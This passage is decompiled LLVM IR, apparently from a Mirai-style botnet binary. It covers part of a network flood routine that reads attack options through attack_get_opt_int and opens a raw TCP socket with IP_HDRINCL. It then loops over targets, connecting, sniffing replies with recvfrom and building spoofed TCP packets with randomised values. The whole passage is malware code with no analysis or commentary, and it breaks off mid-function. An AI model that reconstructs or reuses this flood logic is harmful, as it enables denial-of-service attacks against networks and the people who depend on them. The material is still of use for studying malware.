  %v7_9964 = call i32 @attack_get_opt_int(i32 %v0_995c, i32* %v6_9964, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v6_9940)
  %v0_9968 = load i32, i32* @r5, align 4
  store i32 %v0_9968, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9964, i32* @r7, align 4
  %v0_9978 = load i32, i32* @r4, align 4
  store i32 %v0_9978, i32* %r0.global-to-local, align 4
  %v5_997c = inttoptr i32 %v0_9968 to i32*
  %v6_997c = call i32 @attack_get_opt_int(i32 %v0_9978, i32* %v5_997c, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_9984 = urem i32 %v6_997c, 256
  store i32 %v1_9984, i32* %ip.global-to-local, align 4
  %v0_9988 = load i32, i32* @r5, align 4
  store i32 %v0_9988, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9994 = load i32, i32* @r4, align 4
  store i32 %v0_9994, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v6_997c, 16777216
  %v5_999c = sdiv i32 %sext, 16777216
  %v6_999c = inttoptr i32 %v0_9988 to i32*
  %v7_999c = call i32 @attack_get_opt_int(i32 %v0_9994, i32* %v6_999c, i32 5, i32 1, i32 %v5_999c)
  %v1_99a8 = urem i32 %v7_999c, 256
  store i32 %v1_99a8, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  %v0_99b0 = load i32, i32* @r5, align 4
  store i32 %v0_99b0, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_99b8 = load i32, i32* @r4, align 4
  store i32 %v0_99b8, i32* %r0.global-to-local, align 4
  %v5_99c0 = inttoptr i32 %v0_99b0 to i32*
  %v6_99c0 = call i32 @attack_get_opt_int(i32 %v0_99b8, i32* %v5_99c0, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v1_99a8)
  %v0_99c4 = load i32, i32* @r5, align 4
  store i32 %v0_99c4, i32* %r1.global-to-local, align 4
  %v3_99c8 = mul i32 %v6_99c0, 65536
  store i32 %v3_99c8, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_99d4 = load i32, i32* @r4, align 4
  store i32 %v0_99d4, i32* %r0.global-to-local, align 4
  %v3_99d8 = urem i32 %v6_99c0, 65536
  store i32 %v3_99d8, i32* @sl, align 4
  %v5_99dc = inttoptr i32 %v0_99c4 to i32*
  %v6_99dc = call i32 @attack_get_opt_int(i32 %v0_99d4, i32* %v5_99dc, i32 11, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_99e4 = urem i32 %v6_99dc, 256
  store i32 %v1_99e4, i32* %ip.global-to-local, align 4
  %v0_99e8 = load i32, i32* @r5, align 4
  store i32 %v0_99e8, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_99f4 = load i32, i32* @r4, align 4
  store i32 %v0_99f4, i32* %r0.global-to-local, align 4
  %v5_99fc = inttoptr i32 %v0_99e8 to i32*
  %v6_99fc = call i32 @attack_get_opt_int(i32 %v0_99f4, i32* %v5_99fc, i32 12, i32 1, i32 %v1_99e4)
  %v1_9a04 = urem i32 %v6_99fc, 256
  store i32 %v1_9a04, i32* %ip.global-to-local, align 4
  %v0_9a08 = load i32, i32* @r5, align 4
  store i32 %v0_9a08, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9a14 = load i32, i32* @r4, align 4
  store i32 %v0_9a14, i32* %r0.global-to-local, align 4
  %v5_9a1c = inttoptr i32 %v0_9a08 to i32*
  %v6_9a1c = call i32 @attack_get_opt_int(i32 %v0_9a14, i32* %v5_9a1c, i32 13, i32 1, i32 %v1_9a04)
  %v1_9a24 = urem i32 %v6_9a1c, 256
  store i32 %v1_9a24, i32* %ip.global-to-local, align 4
  %v0_9a28 = load i32, i32* @r5, align 4
  store i32 %v0_9a28, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9a34 = load i32, i32* @r4, align 4
  store i32 %v0_9a34, i32* %r0.global-to-local, align 4
  %v5_9a3c = inttoptr i32 %v0_9a28 to i32*
  %v6_9a3c = call i32 @attack_get_opt_int(i32 %v0_9a34, i32* %v5_9a3c, i32 14, i32 1, i32 %v1_9a24)
  %v1_9a44 = urem i32 %v6_9a3c, 256
  store i32 %v1_9a44, i32* %ip.global-to-local, align 4
  %v0_9a48 = load i32, i32* @r5, align 4
  store i32 %v0_9a48, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9a54 = load i32, i32* @r4, align 4
  store i32 %v0_9a54, i32* %r0.global-to-local, align 4
  %v5_9a5c = inttoptr i32 %v0_9a48 to i32*
  %v6_9a5c = call i32 @attack_get_opt_int(i32 %v0_9a54, i32* %v5_9a5c, i32 15, i32 1, i32 %v1_9a44)
  %v1_9a64 = urem i32 %v6_9a5c, 256
  store i32 %v1_9a64, i32* %ip.global-to-local, align 4
  %v0_9a68 = load i32, i32* @r5, align 4
  store i32 %v0_9a68, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9a74 = load i32, i32* @r4, align 4
  store i32 %v0_9a74, i32* %r0.global-to-local, align 4
  %v5_9a7c = inttoptr i32 %v0_9a68 to i32*
  %v6_9a7c = call i32 @attack_get_opt_int(i32 %v0_9a74, i32* %v5_9a7c, i32 16, i32 1, i32 %v1_9a64)
  %v1_9a84 = urem i32 %v6_9a7c, 256
  store i32 %v1_9a84, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_9a90 = load i32, i32* @r5, align 4
  store i32 %v0_9a90, i32* %r1.global-to-local, align 4
  %v0_9a94 = load i32, i32* @r4, align 4
  store i32 %v0_9a94, i32* %r0.global-to-local, align 4
  %v5_9a9c = inttoptr i32 %v0_9a90 to i32*
  %v6_9a9c = call i32 @attack_get_opt_int(i32 %v0_9a94, i32* %v5_9a9c, i32 0, i32 768, i32 %v1_9a84)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9aac = load i32, i32* @r5, align 4
  store i32 %v0_9aac, i32* %r1.global-to-local, align 4
  %v0_9ab0 = load i32, i32* @r4, align 4
  store i32 %v0_9ab0, i32* %r0.global-to-local, align 4
  %v5_9ab4 = inttoptr i32 %v0_9aac to i32*
  %v6_9ab4 = call i32 @attack_get_opt_int(i32 %v0_9ab0, i32* %v5_9ab4, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_9abc = urem i32 %v6_9ab4, 256
  store i32 %v1_9abc, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_9ad0 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_9ad0, i32* %r0.global-to-local, align 4
  %v7_9ad4 = icmp eq i32 %v3_9ad0, -1
  store i1 %v7_9ad4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_9ad0, i32* @sb, align 4
  br i1 %v7_9ad4, label %dec_label_pc_9cc4, label %dec_label_pc_9ae0

dec_label_pc_9ae0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_9ae8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_9ae8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_9afc = call i32 @__GI_setsockopt(i32 %v3_9ad0, i32 0, i32 3, i32 %v6_9ae8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_9afc, i32* %r0.global-to-local, align 4
  %v7_9b00 = icmp eq i32 %v5_9afc, -1
  store i1 %v7_9b00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9b00, label %dec_label_pc_9cbc, label %dec_label_pc_9b08

dec_label_pc_9b08:                                ; preds = %dec_label_pc_9ae0
  %v0_9b08 = load i32, i32* @r7, align 4
  %v3_9b08 = mul i32 %v0_9b08, 65536
  store i32 %v3_9b08, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_9b10 = load i32, i32* @r6, align 4
  %v2_9b10 = icmp eq i32 %v0_9b10, 0
  store i1 %v2_9b10, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_9b18 = urem i32 %v0_9b08, 65536
  store i32 %v3_9b18, i32* @fp, align 4
  br i1 %v2_9b10, label %dec_label_pc_9f48, label %dec_label_pc_9b20.preheader

dec_label_pc_9b20.preheader:                      ; preds = %dec_label_pc_9b08
  %v2_9b6c = ptrtoint i32* %stack_var_-144 to i32
  %v2_9bb0 = ptrtoint i32* %stack_var_-64 to i32
  %v2_9be8 = ptrtoint i32* %stack_var_-80 to i32
  %v2_9bf4 = ptrtoint i32* %stack_var_-336 to i32
  %v2_9bf8 = ptrtoint i32* %stack_var_-48 to i32
  %v4_9c58 = zext i8 %tmp to i32
  %v1_9c5c = and i32 %v4_9c58, 18
  %v2_9c60 = icmp eq i32 %v1_9c5c, 18
  %v3_9c44 = sext i16 %tmp61 to i32
  %v1_9c68 = and i32 %v4_9c58, 5
  %v2_9c68 = icmp eq i32 %v1_9c68, 0
  %v4_9ba8 = add i32 %v2_9b6c, 82
  %v5_9ba8 = inttoptr i32 %v4_9ba8 to i16*
  %v1_9d98 = add i32 %v6_9a9c, 40
  %v1_9eac = urem i32 %v6_99dc, 2
  %tmp95 = sub nsw i32 0, %v1_9eac
  %v4_9eb4 = and i32 %tmp95, 32
  %v1_9ec4 = urem i32 %v6_99fc, 2
  %tmp96 = sub nsw i32 0, %v1_9ec4
  %v4_9ecc = and i32 %tmp96, 16
  %v1_9edc = urem i32 %v6_9a1c, 2
  %tmp97 = sub nsw i32 0, %v1_9edc
  %v4_9ee4 = and i32 %tmp97, 8
  %v1_9ef4 = urem i32 %v6_9a3c, 2
  %tmp98 = sub nsw i32 0, %v1_9ef4
  %v4_9efc = and i32 %tmp98, 4
  %v1_9f0c = urem i32 %v6_9a5c, 2
  %tmp99 = sub nsw i32 0, %v1_9f0c
  %v3_9f14 = and i32 %tmp99, 2
  %v1_9f24 = urem i32 %v6_9a7c, 2
  br label %dec_label_pc_9b20

dec_label_pc_9b20:                                ; preds = %dec_label_pc_9b20.preheader, %dec_label_pc_9c94
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_9c94 ], [ %tmp34, %dec_label_pc_9b20.preheader ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_9c94 ], [ %tmp37, %dec_label_pc_9b20.preheader ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_9b2c = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_9b2c, i32* %r0.global-to-local, align 4
  %v7_9b30 = icmp eq i32 %v3_9b2c, -1
  store i1 %v7_9b30, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_9b2c, i32* @r5, align 4
  br i1 %v7_9b30, label %dec_label_pc_9c94, label %dec_label_pc_9b3c

dec_label_pc_9b3c:                                ; preds = %dec_label_pc_9b20, %dec_label_pc_9c70
  %v0_9b44 = phi i32 [ %v3_9c84, %dec_label_pc_9c70 ], [ %v3_9b2c, %dec_label_pc_9b20 ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_9c70 ], [ %stack_var_-62.0, %dec_label_pc_9b20 ]
  %stack_var_-60.1 = phi i32 [ %v0_9d44, %dec_label_pc_9c70 ], [ %stack_var_-60.0, %dec_label_pc_9b20 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_9b44 = call i32 @__libc_fcntl(i32 %v0_9b44, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_9b4c = or i32 %v2_9b44, 2048
  store i32 %v1_9b4c, i32* @r2, align 4
  %v0_9b50 = load i32, i32* @r5, align 4
  store i32 %v0_9b50, i32* %r0.global-to-local, align 4
  %v2_9b54 = call i32 @__libc_fcntl(i32 %v0_9b50, i32 4)
  %v3_9b58 = load i32, i32* %stack_var_-44, align 4
  %v5_9b60 = mul i32 %v3_9b58, 24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %v2_9b6c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_9b74 = add i32 %v5_9b60, %arg2
  store i32 %v2_9b74, i32* %r3.global-to-local, align 4
  %v1_9b78 = add i32 %v2_9b74, 20
  %v2_9b78 = inttoptr i32 %v1_9b78 to i8*
  %v3_9b78 = load i8, i8* %v2_9b78, align 1
  %v4_9b78 = zext i8 %v3_9b78 to i32
  store i32 %v4_9b78, i32* %r2.global-to-local, align 4
  %v2_9b7c = icmp ugt i8 %v3_9b78, 30
  %v7_9b7c = icmp eq i8 %v3_9b78, 31
  store i1 %v7_9b7c, i1* %cpsr_z.global-to-local, align 1
  %v2_9b80 = xor i1 %v7_9b7c, true
  %v3_9b80 = and i1 %v2_9b7c, %v2_9b80
  br i1 %v3_9b80, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_9b3c
  %v5_9b80 = add i32 %v2_9b74, 16
  %v6_9b80 = inttoptr i32 %v5_9b80 to i32*
  %v7_9b80 = load i32, i32* %v6_9b80, align 4
  store i32 %v7_9b80, i32* %r3.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_9b3c, %bb
  %v4_9b84 = phi i32 [ %v2_9b74, %dec_label_pc_9b3c ], [ %v7_9b80, %bb ]
  %v4_9b84.stack_var_-60.1 = select i1 %v3_9b80, i32 %v4_9b84, i32 %stack_var_-60.1
  %v2_9b88 = xor i1 %v2_9b7c, true
  %v3_9b88 = or i1 %v7_9b7c, %v2_9b88
  br i1 %v3_9b88, label %dec_label_pc_9cd0, label %dec_label_pc_9b8c

dec_label_pc_9b8c:                                ; preds = %bb71, %dec_label_pc_9cd0
  %v0_9d44 = phi i32 [ %v5_9d20, %dec_label_pc_9cd0 ], [ %v4_9b84.stack_var_-60.1, %bb71 ]
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  %v0_9b94 = load i32, i32* @sl, align 4
  %v9_9b94 = icmp eq i32 %v0_9b94, add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1)
  store i1 %v9_9b94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9b94, label %dec_label_pc_9d2c, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_9b8c
  %v4_9b98 = udiv i32 %v0_9b94, 256
  %v2_9b9c = urem i32 %v0_9b94, 256
  store i32 %v2_9b9c, i32* %r2.global-to-local, align 4
  %v5_9ba0 = mul nuw nsw i32 %v2_9b9c, 256
  %v6_9ba0 = or i32 %v5_9ba0, %v4_9b98
  store i32 %v6_9ba0, i32* %r3.global-to-local, align 4
  store i32 %v2_9b6c, i32* %r0.global-to-local, align 4
  %v2_9ba8 = trunc i32 %v6_9ba0 to i16
  store i16 %v2_9ba8, i16* %v5_9ba8, align 2
  br label %dec_label_pc_9bb0

dec_label_pc_9bb0:                                ; preds = %.thread9, %dec_label_pc_9d2c
  %stack_var_-62.2 = phi i16 [ %v1_9d2c, %dec_label_pc_9d2c ], [ %stack_var_-62.1, %.thread9 ]
  store i32 %v2_9bb0, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_9bb8 = load i32, i32* @r5, align 4
  store i32 %v0_9bb8, i32* %r0.global-to-local, align 4
  %v3_9bbc = call i32 @__libc_connect(i32 %v0_9bb8, i32 %v2_9bb0, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_9bc4 = call i32 @__GI_time(i32* null)
  store i32 %v2_9bc4, i32* %r0.global-to-local, align 4
  store i32 %v2_9bc4, i32* @r4, align 4
  %v9_9c24 = icmp eq i32 %tmp35, %v0_9d44
  %v4_9c4c = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_9c24 to i32
  %v9_9c38 = icmp eq i1 %v9_9c24, false
  %v9_9c50 = icmp eq i32 %v3_9c44, %v4_9c4c
  br label %dec_label_pc_9be0

dec_label_pc_9bd0:                                ; preds = %.thread, %dec_label_pc_9c40, %dec_label_pc_9c68, %bb74
  %v2_9bd0 = call i32 @__GI_time(i32* null)
  %v0_9bd4 = load i32, i32* @r4, align 4
  %v2_9bd4 = sub i32 %v2_9bd0, %v0_9bd4
  store i32 %v2_9bd4, i32* %r0.global-to-local, align 4
  %v7_9bd8 = icmp eq i32 %v2_9bd4, 10
  store i1 %v7_9bd8, i1* %cpsr_z.global-to-local, align 1
  %v8_9bdc = icmp sgt i32 %v2_9bd4, 10
  br i1 %v8_9bdc, label %dec_label_pc_9c70, label %dec_label_pc_9be0

dec_label_pc_9be0:                                ; preds = %dec_label_pc_9bd0, %dec_label_pc_9bb0
  store i32 16, i32* %stack_var_-48, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_9bf4, i32* %r1.global-to-local, align 4
  store i32 %v2_9bf8, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_9c00 = load i32, i32* @sb, align 4
  store i32 %v0_9c00, i32* %r0.global-to-local, align 4
  %v6_9c08 = call i32 @__libc_recvfrom(i32 %v0_9c00, i32 %v2_9bf4, i32 256, i32 16384, i32 %v2_9be8, i32 %v2_9bf8)
  store i32 %v6_9c08, i32* %r2.global-to-local, align 4
  %v7_9c10 = icmp eq i32 %v6_9c08, -1
  store i1 %v7_9c10, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_9c10, label %dec_label_pc_9cc4, label %dec_label_pc_9c1c

dec_label_pc_9c1c:                                ; preds = %dec_label_pc_9be0
  store i32 %v0_9d44, i32* @r1, align 4
  store i32 %tmp35, i32* @r3, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_9c30 = icmp eq i32 %v6_9c08, 40
  store i1 %v7_9c30, i1* %cpsr_z.global-to-local, align 1
  %tmp100 = icmp ult i32 %v6_9c08, 41
  br i1 %tmp100, label %.thread, label %bb74

.thread:                                          ; preds = %dec_label_pc_9c1c
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_9bd0

bb74:                                             ; preds = %dec_label_pc_9c1c
  store i1 %v9_9c38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9c38, label %dec_label_pc_9bd0, label %dec_label_pc_9c40

dec_label_pc_9c40:                                ; preds = %bb74
  store i32 %v3_9c44, i32* @lr, align 4
  store i32 %v2_9b6c, i32* @r3, align 4
  store i32 %v4_9c4c, i32* %r2.global-to-local, align 4
  store i1 %v9_9c50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9c50, label %dec_label_pc_9c58, label %dec_label_pc_9bd0

dec_label_pc_9c58:                                ; preds = %dec_label_pc_9c40
  store i32 %v4_9c58, i32* %r2.global-to-local, align 4
  store i32 %v1_9c5c, i32* @r3, align 4
  store i1 %v2_9c60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9c60, label %dec_label_pc_9d3c, label %dec_label_pc_9c68

dec_label_pc_9c68:                                ; preds = %dec_label_pc_9c58
  store i1 %v2_9c68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9c68, label %dec_label_pc_9bd0, label %dec_label_pc_9c70

dec_label_pc_9c70:                                ; preds = %dec_label_pc_9c68, %dec_label_pc_9bd0
  %v0_9c70 = load i32, i32* @r5, align 4
  store i32 %v0_9c70, i32* %r0.global-to-local, align 4
  %v1_9c74 = call i32 @__GI___libc_close(i32 %v0_9c70)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_9c84 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_9c84, i32* %r0.global-to-local, align 4
  %v3_9c88 = icmp eq i32 %v3_9c84, -1
  %v8_9c88 = icmp eq i32 %v3_9c84, -1
  store i1 %v8_9c88, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_9c84, i32* @r5, align 4
  br i1 %v3_9c88, label %dec_label_pc_9c94, label %dec_label_pc_9b3c

dec_label_pc_9c94:                                ; preds = %dec_label_pc_9c70, %dec_label_pc_9b20, %bb81
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_9b20 ], [ %stack_var_-62.2, %bb81 ], [ %stack_var_-62.2, %dec_label_pc_9c70 ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_9b20 ], [ %v0_9d44, %bb81 ], [ %v0_9d44, %dec_label_pc_9c70 ]
  %v3_9c94 = load i32, i32* %stack_var_-44, align 4
  %v1_9c98 = add i32 %v3_9c94, 1
  store i32 %v1_9c98, i32* @r3, align 4
  %v1_9c9c = load i32, i32* @r6, align 4
  %v9_9c9c = icmp eq i32 %v1_9c98, %v1_9c9c
  store i1 %v9_9c9c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9c98, i32* %stack_var_-44, align 4
  %v5_9ca4 = icmp slt i32 %v1_9c98, %v1_9c9c
  br i1 %v5_9ca4, label %dec_label_pc_9b20, label %dec_label_pc_9ca8

dec_label_pc_9ca8:                                ; preds = %dec_label_pc_9c94
  store i32 %v6_9a9c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9f58

dec_label_pc_9cbc:                                ; preds = %dec_label_pc_9ae0
  %v0_9cbc = load i32, i32* @sb, align 4
  store i32 %v0_9cbc, i32* %r0.global-to-local, align 4
  %v1_9cc0 = call i32 @__GI___libc_close(i32 %v0_9cbc)
  store i32 %v1_9cc0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9cc4

dec_label_pc_9cc4:                                ; preds = %dec_label_pc_9be0, %entry, %dec_label_pc_9cbc
  %v1_9ccc = phi i32 [ %v3_9ad0, %entry ], [ %v1_9cc0, %dec_label_pc_9cbc ], [ 0, %dec_label_pc_9be0 ]
  store i32 %v27_98fc, i32* %lr.global-to-local, align 4
  ret i32 %v1_9ccc

dec_label_pc_9cd0:                                ; preds = %bb71
  %v1_9cd0 = add i32 %v4_9b84, 16
  %v2_9cd0 = inttoptr i32 %v1_9cd0 to i32*
  %v3_9cd0 = load i32, i32* %v2_9cd0, align 4
  store i32 %v3_9cd0, i32* @r4, align 4
  %v0_9cd4 = call i32 @rand_next()
  store i32 %v0_9cd4, i32* %r0.global-to-local, align 4
  %v3_9cd8 = load i32, i32* %stack_var_-44, align 4
  %v5_9ce0 = mul i32 %v3_9cd8, 24
  %v0_9ce8 = load i32, i32* @r4, align 4
  %v1_9ce8 = and i32 %v0_9ce8, 16711680
  store i32 %v1_9ce8, i32* %ip.global-to-local, align 4
  %v3_9cec = udiv i32 %v0_9ce8, 16777216
  %v2_9cf0 = add i32 %v5_9ce0, %arg2
  store i32 %v2_9cf0, i32* %r1.global-to-local, align 4
  %v4_9cf4 = udiv i32 %v1_9ce8, 256
  %v5_9cf4 = or i32 %v4_9cf4, %v3_9cec
  store i32 %v5_9cf4, i32* %r2.global-to-local, align 4
  %v1_9cf8 = and i32 %v0_9ce8, 65280
  store i32 %v1_9cf8, i32* %r3.global-to-local, align 4
  %v1_9cfc = add i32 %v2_9cf0, 20
  %v2_9cfc = inttoptr i32 %v1_9cfc to i8*
  %v3_9cfc = load i8, i8* %v2_9cfc, align 1
  %v4_9cfc = zext i8 %v3_9cfc to i32
  store i32 %v4_9cfc, i32* %ip.global-to-local, align 4
  %v5_9d04 = call i32 @llvm.bswap.i32(i32 %v0_9ce8)
  %v7_9d08 = lshr i32 %v0_9cd4, %v4_9cfc
  %v8_9d08 = add i32 %v7_9d08, %v5_9d04
  store i32 %v8_9d08, i32* %r2.global-to-local, align 4
  %v1_9d0c = and i32 %v8_9d08, 16711680
  store i32 %v1_9d0c, i32* %r0.global-to-local, align 4
  %v1_9d18 = and i32 %v8_9d08, 65280
  store i32 %v1_9d18, i32* %r1.global-to-local, align 4
  %v5_9d20 = call i32 @llvm.bswap.i32(i32 %v8_9d08)
  store i32 %v5_9d20, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9b8c

dec_label_pc_9d2c:                                ; preds = %dec_label_pc_9b8c
  %v0_9d2c = call i32 @rand_next()
  %v1_9d2c = trunc i32 %v0_9d2c to i16
  store i32 %v0_9d2c, i32* %r0.global-to-local, align 4
  store i32 %v2_9b6c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_9bb0

dec_label_pc_9d3c:                                ; preds = %dec_label_pc_9c58
  %v3_9d3c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9d3c, i32* @r4, align 4
  store i32 %v2_9918, i32* %ip.global-to-local, align 4
  %v5_9d44 = mul i32 %v3_9d3c, 16
  %v6_9d44 = add i32 %v5_9d44, %v2_9918
  %v7_9d44 = inttoptr i32 %v6_9d44 to i32*
  store i32 %v0_9d44, i32* %v7_9d44, align 4
  %v0_9d48 = load i32, i32* @r8, align 4
  %v1_9d48 = add i32 %v0_9d48, 4
  %v2_9d48 = inttoptr i32 %v1_9d48 to i32*
  %v3_9d48 = load i32, i32* %v2_9d48, align 4
  store i32 %v3_9d48, i32* %r1.global-to-local, align 4
  %v1_9d54 = and i32 %v3_9d48, 65280
  store i32 %v1_9d54, i32* %r2.global-to-local, align 4
  store i32 %v2_9918, i32* %r0.global-to-local, align 4
  %v0_9d64 = load i32, i32* @r4, align 4
  %v3_9d64 = mul i32 %v0_9d64, 16
  %v2_9d68 = add i32 %v3_9d64, %v2_9918
  store i32 %v2_9d68, i32* %ip.global-to-local, align 4
  %v5_9d6c = call i32 @llvm.bswap.i32(i32 %v3_9d48)
  store i32 %v5_9d6c, i32* %r3.global-to-local, align 4
  %v2_9d70 = add i32 %v2_9d68, 4
  %v3_9d70 = inttoptr i32 %v2_9d70 to i32*
  store i32 %v5_9d6c, i32* %v3_9d70, align 4
  %v0_9d74 = load i32, i32* @r8, align 4
  %v1_9d74 = add i32 %v0_9d74, 8
  %v2_9d74 = inttoptr i32 %v1_9d74 to i32*
  %v3_9d74 = load i32, i32* %v2_9d74, align 4
  store i32 %v3_9d74, i32* %r1.global-to-local, align 4
  %v1_9d78 = and i32 %v3_9d74, 16711680
  store i32 %v1_9d78, i32* %r0.global-to-local, align 4
  store i32 %v6_9a9c, i32* %r2.global-to-local, align 4
  %v5_9d90 = call i32 @llvm.bswap.i32(i32 %v3_9d74)
  store i32 %v5_9d90, i32* %r3.global-to-local, align 4
  %v1_9d94 = add i32 %v0_9d74, 2
  %v2_9d94 = inttoptr i32 %v1_9d94 to i16*
  %v3_9d94 = load i16, i16* %v2_9d94, align 2
  %v4_9d94 = zext i16 %v3_9d94 to i32
  store i32 %v4_9d94, i32* %r1.global-to-local, align 4
  store i32 %v1_9d98, i32* @r7, align 4
  %v0_9d9c = load i32, i32* @lr, align 4
  %v1_9d9c = trunc i32 %v0_9d9c to i16
  %v2_9d9c = load i32, i32* %ip.global-to-local, align 4
  %v3_9d9c = add i32 %v2_9d9c, 14
  %v4_9d9c = inttoptr i32 %v3_9d9c to i16*
  store i16 %v1_9d9c, i16* %v4_9d9c, align 2
  %v0_9da0 = load i32, i32* %r1.global-to-local, align 4
  %v1_9da0 = trunc i32 %v0_9da0 to i16
  %v2_9da0 = load i32, i32* %ip.global-to-local, align 4
  %v3_9da0 = add i32 %v2_9da0, 12
  %v4_9da0 = inttoptr i32 %v3_9da0 to i16*
  store i16 %v1_9da0, i16* %v4_9da0, align 2
  %v0_9da4 = load i32, i32* %r3.global-to-local, align 4
  %v1_9da4 = load i32, i32* %ip.global-to-local, align 4
  %v2_9da4 = add i32 %v1_9da4, 8
  %v3_9da4 = inttoptr i32 %v2_9da4 to i32*
  store i32 %v0_9da4, i32* %v3_9da4, align 4
  %v0_9da8 = load i32, i32* @r7, align 4
  store i32 %v0_9da8, i32* @r0, align 4
  %v0_9dac = call i32 @malloc()
  store i32 %v0_9dac, i32* %r0.global-to-local, align 4
  store i32 %v2_9928, i32* %r3.global-to-local, align 4
  %v2_9db8 = load i32, i32* @r4, align 4
  %v5_9db8 = mul i32 %v2_9db8, 4
  %v6_9db8 = add i32 %v5_9db8, %v2_9928
  %v7_9db8 = inttoptr i32 %v6_9db8 to i32*
  store i32 %v0_9dac, i32* %v7_9db8, align 4
  %v3_9dbc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9dbc, i32* %r2.global-to-local, align 4
  %v0_9dc0 = load i32, i32* %r3.global-to-local, align 4
  %v4_9dc0 = mul i32 %v3_9dbc, 4
  %v5_9dc0 = add i32 %v0_9dc0, %v4_9dc0
